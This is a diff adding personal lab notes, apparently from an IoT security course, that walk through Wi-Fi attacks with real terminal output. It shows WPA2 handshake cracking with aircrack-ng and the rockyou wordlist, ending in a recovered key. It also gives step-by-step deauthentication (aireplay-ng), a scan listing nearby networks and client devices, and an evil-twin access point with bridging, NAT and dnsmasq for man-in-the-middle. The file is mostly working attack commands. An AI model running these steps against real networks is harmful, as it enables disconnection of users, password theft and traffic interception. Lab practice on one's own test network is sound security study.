@@ -1,0 +1,169 @@
+iwconfig 
+sudo airmon-ng check
+
+	Found 3 processes that could cause trouble.
+	Kill them using 'airmon-ng check kill' before putting
+	the card in monitor mode, they will interfere by changing channels
+	and sometimes putting the interface back in managed mode
+
+	  PID Name
+	  487 dhclient
+	  608 NetworkManager
+	  765 wpa_supplicant
+	  
+sudo airmon-ng check kill
+	this command will kill above mentioned processid. 
+
+
+iwconfig
+
+	lo        no wireless extensions.
+
+	eth0      no wireless extensions.
+
+	wlan0     IEEE 802.11  ESSID:off/any  
+		  Mode:Managed  Access Point: Not-Associated   
+		  Retry short limit:7   RTS thr:off   Fragment thr:off
+		  Power Management:on
+
+
+sudo airmon-ng start wlan0 
+
+	PHY     Interface       Driver          Chipset
+
+	phy0    wlan0           brcmfmac        Broadcom 43430
+		        (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
+		        (mac80211 station mode vif disabled for [phy0]wlan0)
+		        
+		     
+iwconfig                   
+	lo        no wireless extensions.
+
+	eth0      no wireless extensions.
+
+	wlan0     IEEE 802.11  ESSID:off/any  
+		  Mode:Managed  Access Point: Not-Associated   
+		  Retry short limit:7   RTS thr:off   Fragment thr:off
+		  Power Management:on
+		  
+		  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  
+		  Retry short limit:7   RTS thr:off   Fragment thr:off
+		  Power Management:on
+
+		        
+
+sudo airodump-ng -w testing.cap wlan0mon  
+	16:58:09  Created capture file "testing.cap-01.cap".
+		        
+		        
+sudo aircrack-ng -w ./nimesh/rockyou.txt -b 0C:80:63:5A:E6:D0 ./captured_packets/captureEsp32.hccapx
+
+                               Aircrack-ng 1.7 
+
+      [00:00:00] 20/10303727 keys tested (106.44 k/s) 
+
+      Time left: 1 day, 2 hours, 53 minutes, 25 seconds          0.00%
+
+                           KEY FOUND! [ 12345678 ]
+
+
+      Master Key     : 51 F0 0E 96 93 40 4F 37 ED 4D 86 27 F2 8D F3 E3 
+                       7E 68 59 4F E1 76 A1 AA 0A BA E8 8A FB AE EE 57 
+
+      Transient Key  : 63 62 CF AB EC 03 8A BB 00 53 A2 EC E8 58 81 C7 
+                       EB 8F B2 86 ED 3B 53 AC 4D 8A 52 05 79 33 98 2A 
+                       92 F7 65 EF 1E 3C 0D 59 BE 53 AA A7 5A 15 B1 B5 
+                       0D 52 46 FF 97 1E EC E6 E9 F1 0A C4 C3 4E E0 37 
+
+      EAPOL HMAC     : E5 94 2B 1F 8E BC 7B CB 11 0E 98 1D 57 6A 8B 22 
+      
+      
+-----------------------------------------------------------------------------------------------------------------
+	deauth attack 
+-----------------------------------------------------------------------------------------------------------------
+step 1 : Find the name of wireless card.
+iwconfig
+
+step 2 : stop the processes that could cause trouble the card from going into monitoring mode.
+sudo airmon-ng check kill
+
+step 3 : put card in monitoring mode
+sudo airmon-ng start wlan0
+
+	step 4 : search for the networks 
+	sudo airodump-ng wlan0mon
+		or to capture the packets in any format
+	sudo airodump-ng -w ~/iot_security/nimesh/dos_attack/dos_packets.cap wlan0mon
+
+step 5 : capture and save packets for particular BSSID 
+to find channel of nwtworks
+iwlist wlan0mon channel 
+
+	sudo airodump-ng -c 1 --bssid 0C:80:63:5A:E6:D0 -w ~/iot_security/nimesh/dos_attack/dos_packets.cap wlan0mon
+
+now open another terminal for deauth attack 
+sudo aireplay-ng -a 0C:80:63:5A:E6:D0 --deauth 150 wlan0mon
+
+
+############################################################################################
+sudo airodump-ng wlan0mon
+
+
+BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+7C:5A:1C:22:9A:8B  -78       19      112   10   6  360   OPN              CDAC 
+5A:73:62:90:76:ED  -71       13        0    0   1  180   WPA2 CCMP   PSK  Galaxy A52C 
+72:52:60:9C:C9:DD  -38       96       35    5   6   65   WPA2 CCMP   PSK  MOB_015		        
+0C:80:63:5A:E6:D0  -40       53      290    2   1  405   WPA2 CCMP   PSK  TLS-TEST 
+
+BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes 
+72:52:60:9C:C9:DD  2C:D9:74:5C:08:A0  -74    0e- 0e   184       20                    
+0C:80:63:5A:E6:D0  C0:49:EF:D0:46:84  -55    0 - 0      0        1                    
+0C:80:63:5A:E6:D0  60:6C:66:37:B1:49  -54    0 - 0e     0        2                    
+
+##########################################################################################		   
+
+
+--------------------------------------------------------------------------------------------------------------------------------
+	Rouge Access Point 
+--------------------------------------------------------------------------------------------------------------------------------
+
+iwconfig
+
+sudo airmon-ng start wlan1
+
+sudo airodump-ng -w ~/iot_security/nimesh/dos_attack/evil_twin_ap.cap wlan1mon
+
+sudo airbase-ng -c 1 --essid TLS-TEST wlan1mon
+
+
+---------------------------------------------------
+Build bridge between interfaces (eth0 - at0)
+
+method 1 
+
+#apt-get install bridge-utils 
+
+brctl addbr mitm 
+brctl addif mitm eth0 
+brctl addif mitm at0 
+
+ifconfig eth0 0.0.0.0 up 
+ifconfig at0 0.0.0.0 up 
+ifconfig mitm up 
+dhclient mitm 
+
+Method 2 
+
+ifconfig at0 up 
+ifconfig at0 10.0.0.1 netmask 255.255.255.0 
+route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
+iptables -P FORWARD ACCEPT
+iptables -t nat -A POSTROUTING -o wlan1mon -j MASQUERADE
+echo 1 > /proc/sys/net/ipv4/ip_forward
+ifconfig 
+
+dnsmasq -C ~/iot_security/evil_twin/dnsmasq.conf -d 
+
+
+
+
